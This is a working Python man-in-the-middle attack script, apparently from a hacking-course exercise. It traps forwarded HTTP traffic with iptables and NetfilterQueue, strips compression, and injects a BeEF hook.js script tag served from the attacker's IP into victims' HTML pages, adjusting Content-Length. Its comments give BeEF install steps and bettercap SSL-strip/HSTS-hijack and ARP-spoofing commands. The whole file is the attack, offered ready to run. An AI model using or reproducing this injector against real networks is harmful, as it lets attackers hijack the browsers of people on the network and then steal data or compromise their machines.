#!/usr/bin/env python

# BeEF
# apt-get update
# apt-get install beef-xss
# beef start
# <script src="http://[ip]:3000/hook.js"></script>
# arp_spoof.py after beef start, otherwise get_mac() will get a IndexError

# only work with http
# https --> ssl strip, downgrade to http
# modify [caplet -/usr/local/share/bettercap/caplets/hstshijack]
# set hstshijack.payloads *:/root/alert.js 
# bettercap -iface eth0 -caplet /root/arp-spoof.cap
# hstshijack/hstshijack

# bettercap -iface eth0 -caplet hstshijack/hstshijack
# need to use modify_iptables_local
# dport/sport --> 8080

import netfilterqueue
import subprocess
import optparse
import scapy.all as scapy
from scapy.error import ScapyFreqFilter
import re
import socket

def modify_iptables_remote(queue_num):
    # modify iptables to trap all packets in NetFilterQueue(0)
    # request from other computer --> FORWARD
    subprocess.call(["iptables", "-I", "FORWARD", "-j", "NFQUEUE", "--queue-num", queue_num])

    print("[+] IPtables modified ... Remote packet trap in queue " + str(queue_num))

def modify_iptables_local(queue_num):
    # modify iptables to trap all packets in NetFilterQueue(0)
    # request from/to host computer --> OUTPUT/INPUT
    subprocess.call(["iptables", "-I", "OUTPUT", "-j", "NFQUEUE", "--queue-num", queue_num])
    subprocess.call(["iptables", "-I", "INPUT", "-j", "NFQUEUE", "--queue-num", queue_num])

    print("[+] IPtables modified ... Local packet trap in queue " + str(queue_num))

def restore_iptables():
    subprocess.call(["iptables", "--flush"])
    print("[+] IPtables restored.")

def get_arguments():
    parser = optparse.OptionParser()
    parser.add_option("-n", "--queue_num", dest="queue_num", help="NFQueue number.")
    options, arguments = parser.parse_args()
    if not options.queue_num:
        parser.error("[-] Please specify a queue number, use --help for more info.")
    return options

def set_load(packet, load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet

def get_ip_address():
    # create a UDP which includes host IP, extract IP from the UDP
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(('8.8.8.8', 80))
        ip = s.getsockname()[0]
    finally:
        s.close()
    return ip

def process_packet(packet):
    # convert to scapy packet
    scapy_packet = scapy.IP(packet.get_payload())

    # http --> raw layer in scapy
    if scapy_packet.haslayer(scapy.Raw):
        try:
            load = scapy_packet[scapy.Raw].load.decode()

            if scapy_packet[scapy.TCP].dport == 80 or scapy_packet[scapy.TCP].dport == 8080:
                print("[+] HTTP Request")
                
                # Accept-Encoding: gzip, deflate --> compress html
                # removed by "" --> plain text html
                # Accept-Encoding:.*?\\r\\n --> ? = not greedy, \\r = \r
                load = re.sub("Accept-Encoding:.*?\\r\\n", "", load)

                # http 1.1 support chunked data transfer, not specify content-length
                load = load.replace("HTTP/1.1", "HTTP/1.0")

            elif scapy_packet[scapy.TCP].sport == 80 or scapy_packet[scapy.TCP].sport == 8080:
                print("[+] HTTP Response")
 
                # injection_code = "<script>alert('test');</script>"
                # need to be MITM
                host_ip = get_ip_address()
                injection_code = '<script src="http://' + host_ip + ':3000/hook.js"></script>'
                
                # load is a str --> replace()
                # replace </body> at the end of html will not affect showing pages, and only occur once
                load = str(load).replace("</body>", injection_code + "</body>")
                
                # content-length: size of html page (injected code might be cut, connection cut)
                # Content-Length:\s\d* --> \s = space, \d = digit
                # (?:group 0)(group 1) --> ?: = non-capture
                content_length_search = re.search("(?:Content-Length:\s)(\d*)", load)
                
                if content_length_search and "text/html" in load:
                    # js, css, image code will contain content-length without </body>
                    # some html may not contain content length
                    content_length = content_length_search.group(1)
                    new_content_length = int(content_length) + len(injection_code)
                    load = load.replace(content_length, str(new_content_length))
                    print("[+] Content length modified...")

            if load != scapy_packet[scapy.Raw].load:
                # if load is modified
                new_packet = set_load(scapy_packet, load)
                packet.set_payload(bytes(new_packet))

        except UnicodeDecodeError:
            pass

    packet.accept()

options = get_arguments()
# modify_iptables_local(options.queue_num)
modify_iptables_remote(options.queue_num)
queue = netfilterqueue.NetfilterQueue()
queue.bind(int(options.queue_num), process_packet)
try:
    queue.run()
except KeyboardInterrupt:
    restore_iptables()

# need to clear cache --> shift + ctrl + del